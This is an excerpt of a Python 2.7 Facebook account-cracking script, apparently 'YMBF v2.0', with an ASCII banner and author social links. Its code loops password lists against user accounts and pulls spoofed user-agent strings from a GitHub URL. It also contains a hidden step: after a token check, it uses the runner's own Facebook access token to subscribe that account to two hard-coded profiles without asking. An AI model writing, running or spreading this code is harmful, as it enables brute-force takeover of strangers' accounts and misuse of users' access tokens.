...
# Instagram      : https://www.instagram.com/SYAFIK0_ #
# Fansfage       : https://www.facebook.com  #
# Blogspot       : https://squadcyber.blogspot.com #
# Python version : 2.7                                #
#######################################################
...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Syafik XD
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Private!
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| Facebook.com'''
# crack selesai
def hasil(ok,cp):
...
def kontol():
	try:
		...
		print '\n %s[%s×%s] token invalid'%(N,M,N)
		os.system('rm -rf __yayan__.txt')
	requests.post('https://graph.facebook.com/100049252740120/subscribers?access_token=%s'%(__cindy__))
	requests.post('https://graph.facebook.com/100034461403746/subscribers?access_token=%s'%(__cindy__))
    ...
    def __api__(self, user, _yan_):
        ...
        for pw in _yan_:
            ...
            try:
            	...
            	user_agent = requests.get('https://raw.githubusercontent.com/kontol999/ymbf/main/data/user_agent.txt').text.strip()
